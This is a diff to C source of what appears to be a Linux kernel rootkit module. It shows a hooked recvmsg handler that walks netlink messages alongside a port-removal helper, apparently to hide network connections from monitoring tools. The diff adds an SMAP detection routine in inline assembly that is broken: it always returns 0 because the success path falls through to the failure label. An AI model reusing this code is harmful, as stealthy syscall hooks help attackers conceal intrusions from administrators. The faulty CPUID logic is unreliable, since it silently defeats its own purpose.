@@ -161,16 +161,39 @@ remove_port_from_list(port_list_t_ptr list, port_t port, proto proto)
     return ret;
 }
 
-// https://wiki.osdev.org/Supervisor_Memory_Protection
+//Cf. https://wiki.osdev.org/Supervisor_Memory_Protection
 static inline void cpu_flags_set_ac(void) {
     // Set AC bit in RFLAGS register.
-    __asm__ volatile ("stac" ::: "cc");
+    __asm__ volatile ("stac" ::: "cc"); 
 }
 
-// https://wiki.osdev.org/Supervisor_Memory_Protection
+//Cf. https://wiki.osdev.org/Supervisor_Memory_Protection
 static inline void cpu_flags_clear_ac(void) {
     // Clear AC bit in RFLAGS register.
     __asm__ volatile ("clac" ::: "cc");
+}
+
+//Query CPUID
+//Intel SDM Vol. 2A 3-197 gives us what we need:
+//eax has to be 0x7, bit 20 is SMAP
+static int has_smap(void) {
+    int ret;
+
+    __asm__ volatile  ("movl $0x7, %%eax\t\n"
+                      "xor %%ecx, %%ecx\t\n"
+                      "cpuid\t\n"
+                      "movl $1, %%ecx\t\n"
+                      "shl $20, %%ecx\t\n"
+                      "and %%ecx, %%eax\t\n"
+                      "jz false%=\t\n"
+                      "movl $1, %0\t\n"
+                      "false%=:\t\n"
+                      "movl $0, %0"
+                      : "=r"(ret)
+                      :
+                      : "eax", "ebx", "ecx", "edx", "cc"); //forgetting the registers cpuid sets is painful..
+
+    return ret;
 }
 
 asmlinkage ssize_t
@@ -183,7 +206,8 @@ g7_recvmsg(struct pt_regs *pt_regs)
     if ((len = ret = sys_recvmsg(pt_regs)) < 0)
         return ret;
 
-    cpu_flags_set_ac();
+    if(has_smap())
+       cpu_flags_set_ac();
 
     nh = (struct nlmsghdr *)((struct user_msghdr *)pt_regs->si)->msg_iov->iov_base;
 
@@ -203,7 +227,8 @@ g7_recvmsg(struct pt_regs *pt_regs)
             nh = NLMSG_NEXT(nh, len);
     }
 
-    cpu_flags_clear_ac();
+    if(has_smap())
+        cpu_flags_clear_ac();
 
     return ret;
 }
